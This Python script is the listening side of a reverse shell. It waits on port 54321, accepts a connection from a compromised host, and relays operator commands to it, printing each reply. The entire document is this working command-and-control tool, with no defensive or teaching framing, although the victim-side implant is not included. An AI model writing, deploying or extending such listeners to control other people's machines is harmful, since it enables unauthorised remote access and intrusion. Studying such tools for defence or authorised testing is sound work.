#!/usr/bin/python3
import socket
from termcolor import colored


addr = None
HOST = ''
PORT = 54321


def shell(_s, _target, _addr):
	while True:
		command = input('* Shell#~%s: ' % str(_addr))
		_target.sendall(command.encode('UTF-8'))
		if command == 'q':
			print(colored('[-] You decided to exit', 'red'))
			_target.close()
			_s.close()
			break
		else:
			result = _target.recv(1024)
			print('Received Message: ', result.decode('UTF-8'))



def server():
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		s.bind((HOST, PORT))
		s.listen(5) # how many connections - 5
		print(colored('[+] Listening for Incoming Connections', 'green'))
		target, addr = s.accept()
		print(colored('[+] Connection Established From: %s' % str(addr), 'green'))
		with target:
			shell(s, target, addr)


server()
